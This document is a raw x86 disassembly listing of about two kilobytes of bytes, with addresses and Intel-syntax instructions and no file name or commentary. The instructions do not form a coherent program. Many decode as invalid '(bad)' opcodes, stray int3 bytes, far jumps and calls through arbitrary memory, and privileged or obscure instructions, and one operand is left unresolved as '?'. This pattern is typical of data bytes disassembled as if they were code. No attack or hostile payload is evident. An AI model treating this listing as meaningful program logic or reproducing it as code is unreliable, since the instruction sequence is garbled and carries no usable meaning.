  4235bc:	jmp    FWORD PTR [eax]
  4235be:	repnz or DWORD PTR [ebp-0x5dff0100],0x77
  4235c6:	xor    BYTE PTR [eax],al
  4235c8:	(bad)  
  4235c9:	cmp    al,0xff
  4235cb:	mov    BYTE PTR [ebx-0x6100f7d5],al
  4235d1:	dec    esp
  4235d3:	jmp    FWORD PTR [ecx-0xb941]
  4235d9:	addr16 int3 
  4235db:	aas    
  4235dc:	jmp    FWORD PTR [edi+ebp*4]
  4235df:	call   DWORD PTR [eax-0x1]
  4235e2:	add    DWORD PTR [eax],0xffffff9e
  4235e5:	dec    esi
  4235e6:	popa   
  4235e7:	mov    esp,ecx
  4235e9:	loope  0x42356e
  4235eb:	jmp    0xff28:0xa9fb00
  4235f2:	cmp    edi,0x2d
  4235f5:	addr16 cmp al,0xcc
  4235f8:	add    BYTE PTR [edx],ch
  4235fa:	xor    DWORD PTR [edx],0x0
  4235fd:	into   
  4235fe:	cmp    eax,0xff000283
  423603:	inc    DWORD PTR [eax]
  423605:	mov    al,ds:0x900ffd5
  42360a:	call   ebp
  42360c:	sub    DWORD PTR [edi-0x7c],0xffffffff
  423610:	test   DWORD PTR [eax],0xea22ff83
  423616:	mov    DWORD PTR [ebx-0x4233dd7d],eax
  42361c:	jmp    DWORD PTR [ebp+0x65]
  42361f:	add    al,bh
  423621:	add    bh,bh
  423623:	sbb    DWORD PTR [esi-0xff8dc3],0xffffff93
  42362a:	int3   
  42362b:	pop    es
  42362c:	add    BYTE PTR [ecx],cl
  42362e:	nop
  42362f:	add    BYTE PTR [eax-0x1e007601],ch
  423635:	mov    bh,0x81
  423637:	(bad)  
  423638:	dec    DWORD PTR [edi+0x26fffd00]
  42363e:	in     eax,dx
  42363f:	add    BYTE PTR [edi+edi*8],bh
  423642:	inc    DWORD PTR [eax]
  423644:	aad    0x1a
  423646:	cmp    al,0xff
  423648:	add    BYTE PTR [ebx],bl
  42364a:	int3   
  42364b:	(bad)  
  42364d:	cmp    eax,0xfff989af
  423652:	inc    DWORD PTR [eax]
  423654:	cmp    eax,0xffe8a2
  423659:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42365a:	add    BYTE PTR [edi+edi*8+0xd],al
  42365e:	(bad)  
  42365f:	(bad)  
  423660:	fxch   st(4)
  423662:	add    BYTE PTR [ebx-0x7cc2fc39],al
  423668:	add    BYTE PTR [ebp-0xdff8300],ch
  42366e:	xchg   esp,eax
  42366f:	(bad)  
  423670:	stc    
  423671:	inc    DWORD PTR [eax]
  423673:	call   FWORD PTR [ecx]
  423675:	mov    WORD PTR [edi-0x1],?
  423678:	mov    DWORD PTR [ecx-0x1fff1477],eax
  42367e:	sti    
  42367f:	int3   
  423680:	dec    edi
  423681:	inc    DWORD PTR [ebx+0x4033b500]
  423687:	inc    DWORD PTR [eax]
  423689:	outs   dx,DWORD PTR ds:[esi]
  42368a:	int3   
  42368b:	lahf   
  42368c:	adc    DWORD PTR ds:0x628961,0xffffff83
  423693:	add    ch,dl
  423695:	push   es
  423696:	push   ebx
  423697:	inc    DWORD PTR [eax]
  423699:	mov    al,ds:0x74cc7aff
  42369e:	sar    edi,cl
  4236a0:	fisttp QWORD PTR [ecx+0x7820000]
  4236a6:	scas   eax,DWORD PTR es:[edi]
  4236a7:	inc    DWORD PTR [ebx+0x83ff17]
  4236ad:	sub    DWORD PTR [edx+0x0],0xffffffc9
  4236b1:	inc    DWORD PTR [eax]
  4236b3:	dec    esp
  4236b5:	jae    0x423706
  4236b7:	dec    DWORD PTR [ecx-0x335d00c9]
  4236bd:	sbb    al,0xd0
  4236bf:	add    BYTE PTR [ecx],al
  4236c1:	mov    edi,edi
  4236c3:	dec    DWORD PTR [edi]
  4236c5:	sub    BYTE PTR [ebx],al
  4236c7:	int3   
  4236c8:	add    BYTE PTR [ebx+0x158954cc],cl
  4236ce:	ud0    edx,DWORD PTR [edx-0x6010000]
  4236d5:	pop    eax
  4236d6:	dec    eax
  4236d7:	(bad)  
  4236d8:	call   DWORD PTR [ebp-0x4cffa500]
  4236de:	push   esi
  4236df:	jmp    FWORD PTR [ebx+0x1b00ffff]
  4236e5:	in     eax,dx
  4236e6:	cmc    
  4236e7:	(bad)  
  4236e8:	call   DWORD PTR ds:0x65ffb400
  4236ee:	add    BYTE PTR es:0xadffffff,dl
  4236f5:	push   esi
  4236f6:	inc    ebp
  4236f7:	add    ah,cl
  4236f9:	iret   
  4236fa:	add    BYTE PTR [eax+eax*1-0x40],dl
  4236fe:	mov    bh,0x83
  423700:	sub    eax,0xd8ff00ff
  423705:	test   eax,0x96ffff2f
  42370a:	call   FWORD PTR [ebp-0x2eac01]
  423710:	aad    0x89
  423712:	mov    DWORD PTR [eax],eax
  423714:	test   al,0x4f
  423716:	ins    BYTE PTR es:[edi],dx
  423717:	add    bh,bh
  423719:	lahf   
  42371a:	call   FWORD PTR [ecx+ecx*4+0x6900c5ac]
  423721:	add    bh,bh
  423723:	dec    ecx
  423725:	mov    ah,0xc5
  423727:	inc    DWORD PTR [eax]
  423729:	sub    al,BYTE PTR [eax]
  42372b:	das    
  42372c:	jmp    FWORD PTR [ecx-0x57]
  42372f:	inc    DWORD PTR [ecx]
  423731:	inc    DWORD PTR [eax]
  423733:	call   DWORD PTR [esi+0xffe392]
  423739:	xchg   ebp,eax
  42373a:	sbb    DWORD PTR [eax-0x576c01],0xffffff97
  423741:	add    bh,bh
  423743:	add    dl,bl
  423745:	add    eax,0xbe00ff2e
  42374a:	call   FWORD PTR [edi+edi*8+0x1d]
  42374e:	call   FWORD PTR fs:[edi-0x49007700]
  423755:	cld    
  423756:	test   al,0x0
  423758:	add    BYTE PTR [edx-0x34],bl
  42375b:	test   edi,edi
  42375d:	add    BYTE PTR [esi],bh
  42375f:	jmp    DWORD PTR [ebx+0x40ff89ff]
  423765:	adc    ecx,DWORD PTR [ecx]
  423767:	dec    esp
  423769:	sahf   
  42376a:	mov    DWORD PTR [esi-0x1d5b7d],eax
  423770:	retf   
  423771:	inc    DWORD PTR [ebx-0x6611f87d]
  423777:	add    DWORD PTR [eax],0x75
  42377a:	xor    DWORD PTR [eax+0x0],0xffffff9d
  42377e:	outs   dx,DWORD PTR ds:[esi]
  42377f:	mov    DWORD PTR [ebp-0x22ff0001],esi
  423785:	repnz mov ds:0x8939ffff,eax
  42378b:	lock push DWORD PTR [ecx-0x7cf4338d]
  423792:	(bad)  
  423793:	dec    eax
  423795:	mov    ebp,DWORD PTR [esi-0x1]
  423798:	mov    DWORD PTR [ecx-0x7f001601],eax
  42379e:	arpl   di,di
  4237a0:	cmc    
  4237a1:	int3   
  4237a2:	inc    DWORD PTR [ebx-0x763071eb]
  4237a8:	call   DWORD PTR [eax+0x0]
  4237ab:	aas    
  4237ac:	dec    ebp
  4237ae:	mov    edi,edi
  4237b0:	hlt    
  4237b1:	int3   
  4237b2:	inc    DWORD PTR [eax]
  4237b4:	cs sub eax,0x5ccff9d
  4237ba:	push   DWORD PTR [ecx+0x0]
  4237bd:	in     al,dx
  4237be:	mov    WORD PTR [ebx+0xffa7],es
  4237c4:	sahf   
  4237c5:	dec    ecx
  4237c6:	push   ebx
  4237c7:	add    DWORD PTR [eax],0x76
  4237ca:	call   FWORD PTR [esi+0xda58ff]
  4237d0:	pop    eax
  4237d1:	int3   
  4237d2:	inc    DWORD PTR [eax]
  4237d4:	add    eax,0x83c08f
  4237d9:	pop    ecx
  4237da:	dec    DWORD PTR [esi+0x20f583]
  4237e0:	stos   DWORD PTR es:[edi],eax
  4237e1:	inc    DWORD PTR [ebx+0x4706aaff]
  4237e7:	add    bh,bh
  4237e9:	hlt    
  4237ea:	(bad)  
  4237eb:	fdiv   st(7),st
  4237ed:	cwde   
  4237ee:	ja     0x4237ef
  4237f0:	pop    esp
  4237f1:	add    BYTE PTR [eax],al
  4237f3:	call   DWORD PTR [ebp-0x7c6661]
  4237f9:	rol    BYTE PTR [eax],1
  4237fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4237fc:	(bad)  
  4237fd:	std    
  4237fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4237ff:	add    BYTE PTR [ebp-0x1],bh
  423802:	cmp    edi,0xb
  423805:	sub    BYTE PTR [ebx-0x2c0001],ah
  42380b:	scas   eax,DWORD PTR es:[edi]
  42380c:	add    BYTE PTR ds:0xccebff0f,ah
  423812:	add    bh,bh
  423814:	repnz shl DWORD PTR [ebx-0x7d],1
  423818:	cmp    ebp,0x0
  42381b:	jl     0x42381d
  42381d:	sub    bh,bl
  42381f:	mov    DWORD PTR [eax-0x1],ebx
  423822:	(bad)  
  423823:	jmp    ecx
  423825:	push   esi
  423826:	aaa    
  423827:	cmp    edi,0x5f
  42382a:	add    esp,0xffffffff
  42382d:	inc    esi
  42382e:	ins    BYTE PTR es:[edi],dx
  42382f:	mov    DWORD PTR [eax+eax*1],ecx
  423832:	add    ah,cl
  423834:	fimul  DWORD PTR [esi-0x10ff00f0]
  42383a:	add    DWORD PTR [ebx-0x4af500],0x1b
  423841:	or     esp,0x0
  423844:	push   ecx
  423845:	jb     0x423810
  423847:	inc    DWORD PTR [eax]
  423849:	jge    0x4237d4
  42384b:	rol    BYTE PTR [eax],0xf2
  42384e:	(bad)  
  42384f:	inc    DWORD PTR ds:0x55ccffff
  423855:	hlt    
  423856:	pop    es
  423857:	int3   
  423858:	add    BYTE PTR ds:0xdacc3500,ch
  42385e:	idiv   edi
  423860:	or     ah,cl
  423862:	add    BYTE PTR [eax],al
  423864:	push   cs
  423865:	xchg   edx,eax
  423866:	hlt    
  423867:	int3   
  423868:	call   FWORD PTR [edx-0x5f330501]
  42386e:	push   ds
  42386f:	adc    DWORD PTR [esi-0x1],0x0
  423873:	add    bh,dl
  423875:	aad    0xf6
  423877:	int3   
  423878:	xor    DWORD PTR [ebx],0xffffffff
  42387b:	jns    0x42387d
  42387d:	test   al,0xa4
  42387f:	int3   
  423880:	mov    esi,0x9fff00cc
  423885:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423886:	icebp  
  423887:	add    DWORD PTR [eax],0xffffffa2
  42388a:	jmp    FWORD PTR [esi-0x33699101]
  423890:	test   bh,bh
  423892:	add    bh,bh
  423894:	dec    ebx
  423895:	or     eax,ebp
  423897:	inc    DWORD PTR [eax]
  423899:	adc    eax,DWORD PTR [eax]
  42389b:	cli    
  42389c:	add    al,dl
  42389e:	dec    ecx
  42389f:	adc    DWORD PTR [esi+0x0],0xffffffff
  4238a3:	and    DWORD PTR [edx-0x24],0x57
  4238a7:	(bad)  
  4238a8:	inc    DWORD PTR [edx]
  4238aa:	jmp    DWORD PTR [esi-0x34]
  4238ad:	or     dl,BYTE PTR [ecx+0xffd783]
  4238b3:	call   DWORD PTR [edx+0x7]
  4238b6:	pop    ebp
  4238b7:	add    DWORD PTR [eax],0x1d
  4238ba:	add    BYTE PTR [edi-0x1],cl
  4238bd:	mov    ds:0x83d4ff5f,eax
  4238c2:	add    BYTE PTR [ecx+0x41f256],cl
  4238c8:	add    bl,ch
  4238ca:	mov    ebx,eax
  4238cc:	jmp    FWORD PTR [ebp-0x88008b]
  4238d2:	(bad)  
  4238d3:	inc    edx
  4238d5:	adc    cl,BYTE PTR [edx]
  4238d7:	inc    DWORD PTR [eax]
  4238d9:	pusha  
  4238da:	dec    ebp
  4238dc:	int3   
  4238dd:	mov    al,ds:0xffc58345
  4238e2:	add    bh,bh
  4238e4:	sub    ebp,DWORD PTR [ebx+0x700cc1a]
  4238ea:	jmp    DWORD PTR [ebx+eax*4+0x39]
  4238ee:	dec    esp
  4238ef:	int3   
  4238f0:	push   esp
  4238f1:	inc    DWORD PTR [ebx-0x247c7fb7]
  4238f7:	dec    DWORD PTR [esi]
  4238f9:	(bad)  
  4238fa:	jmp    DWORD PTR [edx-0x51]
  4238fd:	call   FWORD PTR [eax-0x4e01]
  423903:	sub    BYTE PTR [esi+0xaff8189],bl
  423909:	(bad)  
  42390a:	inc    ecx
  42390c:	out    0x0,al
  42390e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42390f:	sub    edx,0xffffffff
  423912:	mov    DWORD PTR [edx-0x331a7c8c],edx
  423918:	fild   DWORD PTR [ebx-0xdfcf7d]
  42391e:	pushf  
  42391f:	xor    DWORD PTR [esi+0x653fff00],0xffffffff
  423926:	mov    esi,0xff00f1ff
  42392b:	and    al,BYTE PTR [ebx]
  42392d:	push   DWORD PTR [esi]
  42392f:	add    BYTE PTR [ebp+0x0],ah
  423932:	(bad)  
  423933:	jle    0x4238d3
  423935:	add    BYTE PTR [edi],cl
  423937:	dec    DWORD PTR [edi+edi*8]
  42393a:	add    BYTE PTR [ebx-0x6a7c50],cl
  423940:	cmp    edi,0xffffff89
  423943:	inc    ebp
  423944:	and    eax,DWORD PTR [eax]
  423946:	(bad)  
  423947:	jmp    FWORD PTR [ebx-0x63bb0000]
  42394d:	add    BYTE PTR [edi+0x0],ah
  423950:	rol    BYTE PTR [eax],1
  423952:	add    BYTE PTR [eax],ah
  423954:	stos   BYTE PTR es:[edi],al
  423955:	(bad)  
  423956:	aas    
  423957:	int3   
  423958:	repz or DWORD PTR [ecx+0x5f83bd09],0xffffffcc
  423960:	hlt    
  423961:	cmp    edi,0xffffffc6
  423964:	jb     0x423966
  423966:	mov    edi,0xff001aff
  42396b:	dec    esp
  42396c:	imul   edi,edi,0x4f
  42396f:	cmp    DWORD PTR [ecx-0x2a0b7d00],0x0
  423976:	pop    ebp
  423977:	(bad)  
  423978:	cmp    bh,bh
  42397a:	add    BYTE PTR [ecx],al
  42397c:	cli    
  42397d:	call   DWORD PTR [edi]
  42397f:	add    BYTE PTR [edi-0x633f0034],bl
  423985:	add    BYTE PTR [edi+edi*8+0x17],ch
  423989:	add    bh,bh
  42398b:	pop    ss
  42398c:	pop    es
  42398d:	jmp    edx
  42398f:	(bad)  
  423990:	cmp    BYTE PTR [eax],al
  423992:	add    BYTE PTR [ecx],cl
  423994:	xchg   esi,eax
  423995:	call   FWORD PTR [ebx]
  423997:	mov    DWORD PTR [edx],ebx
  423999:	add    ah,cl
  42399b:	mov    ebp,0x158300
  4239a0:	inc    edx
  4239a1:	int3   
  4239a2:	add    BYTE PTR [ecx],dl
  4239a4:	rol    DWORD PTR [ebx-0x300b4],1
  4239aa:	mov    DWORD PTR [ebx+edx*4+0x1bff8383],esi
  4239b1:	inc    DWORD PTR [eax]
  4239b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4239b4:	je     0x4239b5
  4239b6:	jns    0x4239b7
  4239b8:	pop    edx
  4239b9:	dec    esp
  4239bb:	adc    DWORD PTR [edi+edi*8-0x12],edi
  4239bf:	jmp    esi
  4239c1:	add    bh,bh
  4239c3:	lods   al,BYTE PTR ds:[esi]
  4239c4:	push   ebx
  4239c5:	(bad)  
  4239c6:	fiadd  DWORD PTR [eax]
  4239c8:	fdivr  st,st(7)
  4239ca:	jmp    DWORD PTR [ebp-0x7c4b0055]
  4239d0:	std    
  4239d1:	(bad)  
  4239d2:	(bad)  
  4239d3:	ds daa 
  4239d5:	jmp    DWORD PTR [eax+eax*1-0x3f]
  4239d9:	cmp    edi,0xffffffc2
  4239dc:	sar    bh,1
  4239de:	or     edi,edi
  4239e0:	push   es
  4239e1:	inc    DWORD PTR [ebx+0x2fff4f19]
  4239e7:	add    al,dh
  4239e9:	add    bh,bh
  4239eb:	loop   0x4239c1
  4239ed:	add    BYTE PTR [ecx-0x1],dl
  4239f0:	in     eax,dx
  4239f1:	add    bh,bh
  4239f3:	push   ebp
  4239f4:	inc    DWORD PTR [eax]
  4239f6:	xor    eax,DWORD PTR [ebx+0x7fffcc3a]
  4239fc:	mov    ebp,0xf983e7ff
  423a01:	add    BYTE PTR [eax],al
  423a03:	clc    
  423a04:	sar    bh,1
  423a06:	popa   
  423a07:	jmp    DWORD PTR [ebp+0x0]
  423a0a:	dec    DWORD PTR [edi+0xc2ffd9]
  423a10:	gs add bh,bh
  423a13:	cmp    BYTE PTR [ecx-0x1],ch
  423a16:	stos   BYTE PTR es:[edi],al
  423a17:	call   FWORD PTR [ecx-0x6c107700]
  423a1d:	add    bh,al
  423a1f:	add    BYTE PTR [ecx-0x6cfb0001],dh
  423a25:	add    BYTE PTR [ebx-0x1],dh
  423a28:	xor    bh,bh
  423a2a:	xor    DWORD PTR [esi+ebx*1-0x34],0xffffffd8
  423a2f:	call   edi
  423a31:	add    ah,cl
  423a33:	xchg   esi,eax
  423a34:	mov    ch,0x0
  423a36:	push   0x89ff55ff
  423a3b:	jae    0x4239cd
  423a3d:	inc    edx
  423a3f:	add    BYTE PTR [ecx],dl
  423a41:	add    DWORD PTR [ebx-0xcff8d46],0xffffffff
  423a48:	jmp    0xce853a4c
  423a4d:	add    BYTE PTR [ecx],bh
  423a4f:	add    BYTE PTR [ebx-0x1],ah
  423a52:	sbb    DWORD PTR [edi],0xffffff9c
  423a55:	add    ebp,0xffffff89
  423a58:	dec    edx
  423a59:	add    BYTE PTR [ebx+0x3ff6fc2],al
  423a5f:	call   ebx
  423a61:	add    bh,bh
  423a63:	and    DWORD PTR [ebx],eax
  423a65:	jmp    FWORD PTR [edi]
  423a67:	jmp    DWORD PTR [esi]
  423a69:	add    bh,bh
  423a6b:	jne    0x4239f3
  423a6d:	jmp    FWORD PTR [ecx]
  423a6f:	(bad)  
  423a70:	jmp    0x423a71
  423a72:	dec    esp
  423a74:	je     0x423a75
  423a76:	sbb    edi,edi
  423a78:	das    
  423a79:	add    bh,bh
  423a7b:	lods   al,BYTE PTR ds:[esi]
  423a7c:	cli    
  423a7d:	jmp    FWORD PTR [ebx+eax*4]
  423a80:	(bad)  
  423a82:	call   DWORD PTR [esi+eax*2]
  423a85:	(bad)  
  423a86:	jge    0x423a88
  423a88:	xor    BYTE PTR [eax],al
  423a8a:	dec    DWORD PTR [ebx-0x3]
  423a8d:	cmp    DWORD PTR [ebx],0xffffffff
  423a90:	dec    edi
  423a91:	inc    DWORD PTR [eax]
  423a93:	clc    
  423a94:	jmp    FWORD PTR es:[ebx]
  423a97:	add    BYTE PTR [eax+eax*1],dh
  423a9a:	xor    edi,0x4c
  423a9d:	add    BYTE PTR [edi],al
  423a9f:	call   DWORD PTR [edx]
  423aa1:	dec    esp
  423aa3:	jg     0x423a58
  423aa5:	add    BYTE PTR [edx-0xff5201],bh
  423aab:	rol    BYTE PTR [eax],1
  423aad:	cmp    esp,0xffffffff
  423ab0:	or     BYTE PTR [eax],al
  423ab2:	add    BYTE PTR [edi],al
  423ab4:	mov    ds:0x6eff1300,al
  423ab9:	add    DWORD PTR [eax],0xffffffb4
  423abc:	imul   edi,edi,0xff648398
  423ac2:	call   FWORD PTR [esi]
  423ac4:	dec    edi
  423ac5:	int3   
  423ac6:	call   FWORD PTR fs:[eax+eax*1]
  423aca:	int3   
  423acb:	inc    ecx
  423acc:	adc    bh,bh
  423ace:	mov    ch,0x0
  423ad0:	dec    edx
  423ad1:	add    BYTE PTR [ecx-0xe002adb],cl
  423ad7:	jmp    DWORD PTR [edx-0x718a0100]
  423add:	int3   
  423ade:	xchg   DWORD PTR [ecx-0x1400ff76],ecx
  423ae4:	mov    al,0x83
  423ae6:	stos   DWORD PTR es:[edi],eax
  423ae7:	inc    DWORD PTR [ebx]
  423ae9:	add    bh,bh
  423aeb:	jp     0x423b0e
  423aed:	jmp    DWORD PTR [edi-0x1]
  423af0:	data16 (bad) 
  423af2:	call   FWORD PTR [edi-0x25]
  423af5:	add    BYTE PTR [eax+eax*1+0x1e],bl
  423af9:	dec    DWORD PTR [ecx+0x7b89e289]
  423aff:	inc    DWORD PTR [edx]
  423b01:	int3   
  423b02:	call   DWORD PTR [ecx+edx*4-0x1]
  423b06:	jae    0x423b08
  423b08:	sbb    bh,bh
  423b0a:	add    BYTE PTR [ebp+0x7c],dl
  423b0d:	int3   
  423b0e:	fiadd  DWORD PTR [eax]
  423b10:	inc    edi
  423b11:	inc    DWORD PTR [ebx-0x6fff1c47]
  423b17:	add    BYTE PTR [esi],cl
  423b19:	int3   
  423b1a:	jmp    DWORD PTR [ebx-0x8b006e]
  423b20:	mov    cl,0x83
  423b22:	add    BYTE PTR [ebx-0x10],bh
  423b25:	call   FWORD PTR [edx]
  423b27:	add    bh,dh
  423b29:	cmp    edi,0xffffffce
  423b2c:	lahf   
  423b2d:	call   DWORD PTR [ebp-0x7d]
  423b30:	cmp    al,BYTE PTR [eax]
  423b32:	add    BYTE PTR [eax],bl
  423b34:	fcos   
  423b36:	test   ah,0x14
  423b39:	mov    edi,edi
  423b3b:	mov    edx,0x83ca89a0
  423b40:	mov    esp,0xd6e5cc00
  423b45:	add    BYTE PTR [edx-0x7d],bh
  423b48:	dec    esi
  423b49:	int3   
  423b4a:	call   DWORD PTR [esi]
  423b4c:	js     0x423b4e
  423b4e:	jle    0x423b50
  423b50:	jns    0x423b1e
  423b52:	mov    DWORD PTR [esi+eax*2-0x38009101],esp
  423b59:	inc    DWORD PTR [ebx+0x7d001065]
  423b5f:	int3   
  423b60:	dec    eax
  423b61:	add    DWORD PTR [eax],0x2f
  423b64:	loope  0x423b66
  423b66:	mov    eax,ds:0xff0056cc
  423b6b:	sbb    BYTE PTR [esi+0x41ff7700],al
  423b71:	dec    esp
  423b73:	ins    DWORD PTR es:[edi],dx
  423b74:	lock call DWORD PTR [edx-0x7d]
  423b78:	push   edi
  423b79:	cmp    edi,0xfffffff7
  423b7c:	ja     0x423b4a
  423b7e:	call   0xb5b9:0x8396ff
  423b85:	and    DWORD PTR [edi+0x0],0xffffff97
  423b89:	(bad)  
  423b8a:	call   ebx
  423b8c:	sar    edi,cl
  423b8e:	outs   dx,DWORD PTR ds:[esi]
  423b8f:	int3   
  423b90:	mov    esi,0xf33a00ff
  423b95:	dec    DWORD PTR ds:0xffcc81ff
  423b9b:	push   ebp
  423b9c:	iret   
  423b9d:	call   DWORD PTR [ebx-0x33762801]
  423ba3:	mov    ch,0x20
  423ba5:	add    BYTE PTR [edi+edi*8+0x5bcc83dd],dl
  423bac:	inc    ebp
  423bad:	int3   
  423bae:	cmp    bh,0x35
  423bb1:	(bad)  
  423bb2:	(bad)  
  423bb3:	jnp    0x423be4
  423bb5:	add    BYTE PTR ds:0x82ff,bh
  423bbb:	cmp    al,0x78
  423bbd:	push   ebx
  423bbf:	add    BYTE PTR [eax-0x77],dh
  423bc2:	inc    ecx
  423bc4:	or     BYTE PTR [ebx-0xbffc9],al
  423bca:	jmp    FWORD PTR [eax+0x6837a]
  423bd0:	fld    DWORD PTR [eax]
  423bd2:	or     DWORD PTR [edi],0x2c
  423bd5:	int3   
  423bd6:	sti    
  423bd7:	dec    DWORD PTR [ecx]
  423bd9:	mov    edi,edi
  423bdb:	mov    cl,0x74
  423bdd:	call   DWORD PTR [ecx]
  423bdf:	jmp    FWORD PTR [edx]
  423be1:	add    BYTE PTR [ebx-0x4600c44b],al
  423be7:	sbb    DWORD PTR [ebp+0x0],0xffffffff
  423beb:	(bad)  
  423bed:	call   FWORD PTR [ecx-0x7c00637d]
  423bf3:	lock mov eax,DWORD PTR [eax]
  423bf6:	and    al,0xff
  423bf8:	jg     0x423bf9
  423bfa:	(bad)  
  423bfb:	cmp    eax,ebx
  423bfd:	dec    ebp
  423bff:	(bad)  
  423c00:	fmul   DWORD PTR [ecx-0x33195e00]
  423c06:	jmp    FWORD PTR ds:[edi-0x1]
  423c0a:	jmp    FWORD PTR [ebp-0x1a]
  423c0d:	jmp    FWORD PTR [esi]
  423c0f:	(bad)  
  423c10:	inc    BYTE PTR [eax]
  423c12:	(bad)  
  423c13:	jns    0x423c89
  423c15:	add    BYTE PTR [edx-0x1],dl
  423c18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423c19:	inc    DWORD PTR [ebx-0x4b7cabf3]
  423c1f:	dec    esp
  423c21:	add    bh,bh
  423c23:	lods   al,BYTE PTR ds:[esi]
  423c24:	cmp    edi,0xffd1ff9a
  423c2a:	add    BYTE PTR [ecx-0x1b],dl
  423c2d:	cmp    DWORD PTR [ebp+0x0],0x29
  423c31:	add    BYTE PTR [eax],al
  423c33:	ret    0x50
  423c36:	fild   DWORD PTR [ebx+0x500ffae]
  423c3c:	and    al,0xff
  423c3e:	dec    ebx
  423c3f:	push   DWORD PTR [ebp+0x593fffff]
  423c45:	add    BYTE PTR [edx],ch
  423c47:	add    BYTE PTR [eax+0x0],dl
  423c4a:	add    dh,ch
  423c4c:	xchg   esi,eax
  423c4d:	add    BYTE PTR [ecx],dl
  423c4f:	int3   
  423c50:	repz inc DWORD PTR [ebx-0x73ffd0c2]
  423c57:	sbb    edx,0x0
  423c5a:	cmp    DWORD PTR [edi+edi*8-0x1],0x54
  423c5f:	call   FWORD PTR [esi-0x1]
  423c62:	push   DWORD PTR [esp+edx*8-0xd004a01]
  423c69:	int3   
  423c6a:	call   FWORD PTR [edx-0x7c8b009f]
  423c70:	inc    DWORD PTR [eax]
  423c72:	call   FWORD PTR [esi-0x7cac7ca2]
  423c78:	and    al,0xff
  423c7a:	add    BYTE PTR [edi-0x6e],ch
  423c7d:	sub    ebp,0x0
  423c80:	popa   
  423c81:	int3   
  423c82:	xor    DWORD PTR [ecx],0xffffffba
  423c85:	mov    DWORD PTR [ecx],ecx
  423c87:	add    BYTE PTR [edi+edi*8-0x7c920001],ah
  423c8e:	inc    ebx
  423c8f:	jmp    DWORD PTR [ebx+0x0]
  423c92:	(bad)  
  423c93:	fisttp QWORD PTR [ebx-0x1]
  423c96:	xor    eax,DWORD PTR [eax]
  423c98:	adc    edi,edi
  423c9a:	mov    DWORD PTR [edi+0x5a],ecx
  423c9d:	call   FWORD PTR [edi-0x1]
  423ca0:	popa   
  423ca1:	cmp    edi,0xffffffab
  423ca4:	dec    esp
  423ca5:	mov    DWORD PTR [edx],ecx
  423ca7:	jmp    ebx
  423ca9:	add    BYTE PTR [ebx+0x21ffbc7d],al
  423caf:	mov    DWORD PTR [esi-0x1],edx
  423cb2:	add    BYTE PTR [edi+0xf0066],cl
  423cb8:	pushf  
  423cb9:	cmp    edi,0xffffffc4
  423cbc:	out    0x83,eax
  423cbe:	call   FWORD PTR cs:[ecx+0x0]
  423cc2:	add    BYTE PTR [edx+0x1],cl
  423cc5:	jmp    edi
  423cc7:	add    BYTE PTR [esi-0x7d],ch
  423cca:	dec    DWORD PTR [ecx+0xfa0010]
  423cd0:	xchg   ebp,eax
  423cd1:	add    DWORD PTR [eax],0xffffffbc
  423cd4:	mov    ecx,0x1a0015ff
  423cd9:	dec    DWORD PTR [ecx+0x2bff9d1e]
  423cdf:	add    BYTE PTR [eax+0x0],ch
  423ce2:	inc    edi
  423ce4:	add    BYTE PTR [eax],al
  423ce6:	dec    ecx
  423ce7:	dec    DWORD PTR [edx]
  423ce9:	add    BYTE PTR [eax],al
  423ceb:	inc    esi
  423cec:	or     BYTE PTR [ebx+0x3aff48],al
  423cf2:	call   DWORD PTR [eax-0x4b]
  423cf5:	add    BYTE PTR [ecx-0x1],dl
  423cf8:	js     0x423cf9
  423cfa:	add    BYTE PTR [edi-0x8400a9],dh
  423d00:	mov    eax,DWORD PTR [eax]
  423d02:	(bad)  
  423d03:	cli    
  423d04:	push   ds
  423d05:	add    BYTE PTR [ebp-0x767cce7d],dl
  423d0b:	sbb    eax,0xff08ffe4
  423d10:	fwait
  423d11:	add    bh,bh
  423d13:	push   ebx
  423d14:	cdq    
  423d15:	jmp    FWORD PTR [ebx-0x1]
  423d18:	fdivr  st,st(7)
  423d1a:	jmp    edi
  423d1c:	adc    DWORD PTR [eax],eax
  423d1e:	lock add BYTE PTR [eax+eax*1],bh
  423d22:	jmp    esp
  423d24:	push   ds
  423d25:	add    BYTE PTR [edi+edi*8],ah
  423d28:	cmc    
  423d29:	mov    edi,edi
  423d2b:	push   esi
  423d2c:	xchg   edi,edi
  423d2e:	arpl   WORD PTR [eax],ax
  423d30:	into   
  423d31:	mov    edi,edi
  423d33:	and    DWORD PTR [ebp+0x57009a89],esp
  423d39:	add    bh,bh
  423d3b:	and    ah,dl
  423d3d:	call   DWORD PTR [ebp-0x1]
  423d40:	std    
  423d41:	cmp    edi,0xffffffe1
  423d44:	add    BYTE PTR fs:[eax+eax*1-0x23],bh
  423d49:	dec    esp
  423d4b:	jb     0x423d3d
  423d4d:	int3   
  423d4e:	cmp    eax,0xcc003c83
  423d53:	adc    ebx,esp
  423d55:	add    BYTE PTR [ecx-0xff01],dh
  423d5b:	mov    al,ds:0x832d004b
  423d60:	mov    ds:0x717783ff,eax
  423d65:	add    BYTE PTR [edi-0x1],bl
  423d68:	fmulp  st(4),st
  423d6a:	mov    DWORD PTR [edi-0x70],ebx
  423d6d:	mov    DWORD PTR [eax+eax*1+0x200ffc2],ebx
  423d74:	inc    esp
  423d75:	jmp    ebp
  423d77:	or     eax,0x0
  423d7a:	add    BYTE PTR [ecx-0xb000d9],dl
  423d80:	push   0xffffff83
  423d82:	int3   
  423d83:	(bad)  
  423d84:	aas    
  423d85:	(bad)  
  423d86:	js     0x423d0b
  423d88:	or     eax,0x187f8989
  423d8d:	add    BYTE PTR [ebx],cl
  423d8f:	push   ebx
  423d91:	dec    DWORD PTR [ecx-0x51000ec4]
  423d97:	inc    DWORD PTR [ebx-0x1]
  423d9a:	(bad)  
  423d9b:	fisttp QWORD PTR [edi-0x627c0f7d]
  423da1:	add    BYTE PTR [ebx-0x3cffd1b6],al
  423da7:	dec    DWORD PTR [ebx+0x1a8bff00]
  423dad:	add    dh,dh
  423daf:	adc    DWORD PTR [ebx-0x34],0xffffffff
  423db3:	in     eax,0xf3
  423db5:	add    bl,al
  423db7:	int3   
  423db8:	rol    DWORD PTR [eax],1
